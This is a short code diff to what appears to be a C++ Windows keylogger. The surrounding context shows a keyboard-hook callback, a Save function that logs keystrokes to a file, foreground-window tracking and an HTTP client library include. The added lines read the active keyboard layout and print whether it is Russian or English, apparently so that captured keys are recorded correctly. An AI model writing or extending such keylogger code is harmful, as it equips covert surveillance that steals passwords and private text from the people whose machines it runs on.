@@ -8,6 +8,8 @@
 #include <string.h>
 #include <cpr/cpr.h>
 #include "stdafx.h"
+#include <locale>
+#include <iomanip>
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -27,6 +29,11 @@ std::ofstream OUTPUT_FILE;
 char lastwindow[256];
 
 std::string key;
+
+/*#define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
+
+#define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
+#define SUBLANGID(lgid)        ((WORD  )(lgid) >> 10) */
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
@@ -78,6 +85,22 @@ int Save(int key_stroke)
 
 	threadID = GetWindowThreadProcessId(foreground, NULL);
 	layout = GetKeyboardLayout(threadID);
+
+	WORD language_id = LOWORD(GetKeyboardLayout(threadID));
+	
+	int sub_language_id = SUBLANGID(language_id);
+	int primary_language_id = PRIMARYLANGID(language_id);
+
+	std::cout << sub_language_id << '\n';
+	std::cout << primary_language_id << '\n';
+
+	if(primary_language_id==25)
+	{
+		std::cout << "rus" << '\n';
+	}else if (primary_language_id == 9)
+	{
+		std::cout << "eng" << '\n';
+	}
 	
 	if (foreground) {
 		//get keyboard layout of the thread
